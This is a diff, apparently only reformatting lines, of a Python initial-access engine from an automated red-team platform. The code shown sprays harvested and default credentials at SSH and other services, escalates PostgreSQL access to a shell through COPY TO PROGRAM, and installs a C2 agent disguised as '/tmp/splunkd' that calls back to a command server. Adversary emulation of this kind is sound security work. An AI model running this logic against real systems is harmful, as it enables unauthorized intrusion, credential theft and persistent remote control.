@@ -87,23 +87,30 @@ class InitialAccessEngine:
         """
         attempted = 0
         for port_num, svc_names, protocol, mcp_tool, trait, creds_key in _PROTOCOL_MAP:
-            if not any(
-                s.get("port") == port_num and s.get("service", "") in svc_names
-                for s in services
-            ):
+            if not any(s.get("port") == port_num and s.get("service", "") in svc_names for s in services):
                 continue
 
             attempted += 1
 
             if protocol == "ssh":
                 result = await self.try_ssh_login(
-                    db, operation_id, target_id, ip, port=port_num,
+                    db,
+                    operation_id,
+                    target_id,
+                    ip,
+                    port=port_num,
                 )
             else:
                 result = await self._try_mcp_credential_check(
-                    db, operation_id, target_id, ip,
-                    protocol=protocol, mcp_tool=mcp_tool,
-                    trait=trait, creds_key=creds_key, port=port_num,
+                    db,
+                    operation_id,
+                    target_id,
+                    ip,
+                    protocol=protocol,
+                    mcp_tool=mcp_tool,
+                    trait=trait,
+                    creds_key=creds_key,
+                    port=port_num,
                 )
 
             if result.success:
@@ -111,11 +118,16 @@ class InitialAccessEngine:
 
         if attempted == 0:
             return InitialAccessResult(
-                success=False, method="none", credential=None,
-                agent_deployed=False, error="No targetable services found",
+                success=False,
+                method="none",
+                credential=None,
+                agent_deployed=False,
+                error="No targetable services found",
             )
         return InitialAccessResult(
-            success=False, method="none", credential=None,
+            success=False,
+            method="none",
+            credential=None,
             agent_deployed=False,
             error=f"All protocols failed ({attempted} attempted)",
         )
@@ -148,46 +160,55 @@ class InitialAccessEngine:
         if mgr is None or not mgr.is_connected("credential-checker"):
             logger.debug(
                 "credential-checker MCP not available; skipping %s check for %s",
-                protocol.upper(), ip,
+                protocol.upper(),
+                ip,
             )
             return InitialAccessResult(
-                success=False, method="none", credential=None,
+                success=False,
+                method="none",
+                credential=None,
                 agent_deployed=False,
                 error=f"credential-checker MCP not available for {protocol.upper()}",
             )
 
         harvested = await self._load_harvested_creds(db, operation_id)
         seen = set(harvested)
-        creds = harvested + [
-            c for c in _CREDS_BY_PROTOCOL.get(creds_key, []) if c not in seen
-        ]
+        creds = harvested + [c for c in _CREDS_BY_PROTOCOL.get(creds_key, []) if c not in seen]
 
         for username, password in creds:
             try:
                 result = await mgr.call_tool(
-                    "credential-checker", mcp_tool,
+                    "credential-checker",
+                    mcp_tool,
                     {"target": ip, "username": username, "password": password, "port": port},
                 )
-                text = (
-                    result["content"][0]["text"]
-                    if result.get("content")
-                    else "{}"
-                )
+                text = result["content"][0]["text"] if result.get("content") else "{}"
                 parsed = json.loads(text)
 
                 facts = parsed.get("facts")
                 if facts and isinstance(facts[0], dict) and "value" in facts[0]:
                     cred_value = facts[0]["value"]
                     await self._write_credential_fact(
-                        db, operation_id, target_id, cred_value, trait=trait,
+                        db,
+                        operation_id,
+                        target_id,
+                        cred_value,
+                        trait=trait,
                     )
                     await self._register_agent(
-                        db, operation_id, target_id, ip,
-                        f"{username}:{password}", protocol=protocol,
+                        db,
+                        operation_id,
+                        target_id,
+                        ip,
+                        f"{username}:{password}",
+                        protocol=protocol,
                     )
                     logger.info(
                         "%s login succeeded for %s@%s:%s",
-                        protocol.upper(), username, ip, port,
+                        protocol.upper(),
+                        username,
+                        ip,
+                        port,
                     )
 
                     # SPEC-057: PostgreSQL COPY TO PROGRAM shell escalation
@@ -195,8 +216,14 @@ class InitialAccessEngine:
                     # from data-plane to shell-capable access.
                     if protocol == "postgresql":
                         await self._try_postgresql_shell_escalation(
-                            db, operation_id, target_id, ip,
-                            username, password, port, mgr,
+                            db,
+                            operation_id,
+                            target_id,
+                            ip,
+                            username,
+                            password,
+                            port,
+                            mgr,
                         )
 
                     return InitialAccessResult(
@@ -209,13 +236,18 @@ class InitialAccessEngine:
             except Exception:
                 logger.debug(
                     "%s check failed for %s@%s:%s",
-                    protocol.upper(), username, ip, port,
+                    protocol.upper(),
+                    username,
+                    ip,
+                    port,
                 )
                 continue
 
         logger.warning("All %s credentials failed for %s:%s", protocol.upper(), ip, port)
         return InitialAccessResult(
-            success=False, method="none", credential=None,
+            success=False,
+            method="none",
+            credential=None,
             agent_deployed=False,
             error=f"All {protocol.upper()} credentials failed",
         )
@@ -313,7 +345,9 @@ class InitialAccessEngine:
                 if download_result.exit_status != 0:
                     logger.error(
                         "sandcat download failed (arch=%s, file=%s): %s",
-                        arch, sandcat_file, download_result.stderr,
+                        arch,
+                        sandcat_file,
+                        download_result.stderr,
                     )
                     return False
 
@@ -331,7 +365,9 @@ class InitialAccessEngine:
                     logger.warning(
                         "sandcat download returned non-ELF content "
                         "(magic=%s, file=%s); skipping agent deployment for %s",
-                        magic, sandcat_file, ip,
+                        magic,
+                        sandcat_file,
+                        ip,
                     )
                     # Return False: SSH access was achieved but agent could not be deployed.
                     return False
@@ -348,7 +384,8 @@ class InitialAccessEngine:
                         logger.warning(
                             "Kernel %s is below 2.6.32 — sandcat Go binary may crash "
                             "on %s due to epoll_create1 ENOSYS (requires Go ≤ 1.17 build)",
-                            kernel_str, ip,
+                            kernel_str,
+                            ip,
                         )
                 except ValueError:
                     pass  # Couldn't parse kernel version — proceed anyway
@@ -357,13 +394,16 @@ class InitialAccessEngine:
                 await conn.run("chmod +x /tmp/splunkd", check=True)
                 # Launch agent in background
                 await conn.run(
-                    f"nohup /tmp/splunkd -server {c2_host} -group red"
-                    f" > /tmp/splunkd.log 2>&1 &",
+                    f"nohup /tmp/splunkd -server {c2_host} -group red > /tmp/splunkd.log 2>&1 &",
                     check=True,
                 )
                 logger.info(
                     "C2 sandcat launched on %s (arch=%s, kernel=%s, file=%s, callback=%s)",
-                    ip, arch, kernel_str, sandcat_file, c2_host,
+                    ip,
+                    arch,
+                    kernel_str,
+                    sandcat_file,
+                    c2_host,
                 )
 
             # Wait for agent to beacon home (skip in test/mock-beacon mode)
@@ -372,9 +412,7 @@ class InitialAccessEngine:
             return True
 
         except Exception:
-            logger.exception(
-                "bootstrap_c2_agent failed for %s", ip
-            )
+            logger.exception("bootstrap_c2_agent failed for %s", ip)
             return False
 
     # ------------------------------------------------------------------
@@ -404,19 +442,30 @@ class InitialAccessEngine:
         # Upsert: update existing agent or insert new one
         row = await db.fetchrow(
             "SELECT id FROM agents WHERE paw = $1 AND operation_id = $2",
-            paw, operation_id,
+            paw,
+            operation_id,
         )
         if row:
             await db.execute(
                 "UPDATE agents SET host_id=$1, status='alive', privilege=$2, platform=$3, last_beacon=$4 WHERE id=$5",
-                target_id, privilege, platform, now, row["id"],
+                target_id,
+                privilege,
+                platform,
+                now,
+                row["id"],
             )
         else:
             await db.execute(
                 """INSERT INTO agents
                     (id, paw, host_id, status, privilege, platform, operation_id, last_beacon)
                 VALUES ($1, $2, $3, 'alive', $4, $5, $6, $7)""",
-                str(uuid.uuid4()), paw, target_id, privilege, platform, operation_id, now,
+                str(uuid.uuid4()),
+                paw,
+                target_id,
+                privilege,
+                platform,
+                operation_id,
+                now,
             )
 
     # Backward-compatible alias
@@ -511,7 +560,10 @@ class InitialAccessEngine:
                 try:
                     logger.debug(
                         "Trying SSH %s@%s:%s with password %s",
-                        username, ip, port, password,
+                        username,
+                        ip,
+                        port,
+                        password,
                     )
                     async with await asyncio.wait_for(
                         asyncssh.connect(
@@ -531,9 +583,7 @@ class InitialAccessEngine:
                             target_id=target_id,
                             cred_value=cred_str,
                         )
-                        logger.info(
-                            "SSH login succeeded for %s@%s:%s", username, ip, port
-                        )
+                        logger.info("SSH login succeeded for %s@%s:%s", username, ip, port)
 
                         # Register SSH agent record (enables DirectSSHEngine routing)
                         await self._register_ssh_agent(
@@ -546,27 +596,25 @@ class InitialAccessEngine:
 
                         # Bootstrap C2 agent only when EXECUTION_ENGINE=c2
                         if settings.EXECUTION_ENGINE == "c2":
-                            c2_host = (
-                                settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
-                            )
+                            c2_host = settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
                             await self.bootstrap_c2_agent(
                                 ip=ip,
                                 credential=(username, password),
                                 c2_host=c2_host,
                             )
 
-                        result_holder.append(InitialAccessResult(
-                            success=True,
-                            method="ssh_credential",
-                            credential=f"{username}:{password}",
-                            agent_deployed=False,
-                            error=None,
-                        ))
+                        result_holder.append(
+                            InitialAccessResult(
+                                success=True,
+                                method="ssh_credential",
+                                credential=f"{username}:{password}",
+                                agent_deployed=False,
+                                error=None,
+                            )
+                        )
                         found_event.set()
                 except (asyncssh.Error, OSError, asyncio.TimeoutError):
-                    logger.debug(
-                        "SSH login failed for %s@%s:%s", username, ip, port
-                    )
+                    logger.debug("SSH login failed for %s@%s:%s", username, ip, port)
 
         tasks = [asyncio.create_task(_try_one(u, p)) for u, p in ordered_creds]
         await asyncio.wait(tasks)
@@ -611,37 +659,43 @@ class InitialAccessEngine:
         """
         try:
             result = await mgr.call_tool(
-                "credential-checker", "postgresql_exec_check",
+                "credential-checker",
+                "postgresql_exec_check",
                 {"target": ip, "username": username, "password": password, "port": port},
             )
-            text = (
-                result["content"][0]["text"]
-                if result.get("content")
-                else "{}"
-            )
+            text = result["content"][0]["text"] if result.get("content") else "{}"
             parsed = json.loads(text)
 
             shell_facts = parsed.get("facts")
             if shell_facts and isinstance(shell_facts[0], dict) and "value" in shell_facts[0]:
                 shell_value = shell_facts[0]["value"]
                 await self._write_credential_fact(
-                    db, operation_id, target_id, shell_value,
+                    db,
+                    operation_id,
+                    target_id,
+                    shell_value,
                     trait="credential.shell",
                 )
                 logger.warning(
                     "PostgreSQL COPY TO PROGRAM escalation succeeded for %s@%s:%s",
-                    username, ip, port,
+                    username,
+                    ip,
+                    port,
                 )
             else:
                 raw = parsed.get("raw_output", "unknown")
                 logger.warning(
                     "PostgreSQL COPY TO PROGRAM escalation failed for %s@%s:%s — %s",
-                    username, ip, port, raw,
+                    username,
+                    ip,
+                    port,
+                    raw,
                 )
         except Exception:
             logger.debug(
                 "PostgreSQL shell escalation skipped for %s:%s (MCP error or unavailable)",
-                ip, port,
+                ip,
+                port,
             )
 
     async def _write_credential_fact(
@@ -661,7 +715,13 @@ class InitialAccessEngine:
             "(id, trait, value, category, source_technique_id, "
             "source_target_id, operation_id, score, collected_at) "
             "VALUES ($1, $2, $3, $4, NULL, $5, $6, 1, $7) ON CONFLICT DO NOTHING",
-            fact_id, trait, cred_value, "credential", target_id, operation_id, now,
+            fact_id,
+            trait,
+            cred_value,
+            "credential",
+            target_id,
+            operation_id,
+            now,
         )
 
         # Broadcast unconditionally — DB-level UNIQUE index handles dedup
